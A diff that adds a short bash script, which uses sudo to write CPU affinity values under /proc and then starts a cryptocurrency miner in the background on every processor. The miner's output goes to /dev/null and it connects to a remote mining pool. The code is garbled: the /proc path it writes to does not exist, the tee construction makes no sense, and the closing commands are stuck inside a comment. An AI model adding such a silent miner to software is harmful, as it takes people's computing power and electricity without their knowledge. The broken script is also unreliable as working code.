@@ -1,0 +1,5 @@
+#!/bin/bash 
+set -e  # Exit immediately if any command fails  
+# Set the CPU affinity mask (optional)  
+echo 1-23 | xargs -I {} sudo tee /proc/sys/dev/{}/cpus_allowed <<< {}:0-1    # Allow all CPUs to be used for mining  
+yescryptminerd --algo yes --threads $NPROCESSORS --url https://pool.yespower.io:8443/$USER &> /dev/null &    # Start the miner with specified number of threads, URL of the pool, and output file descriptor pointing to null device      echo "Mining has started!"      sleep infinity    wait           kill $(jobs -p)         exit $?```
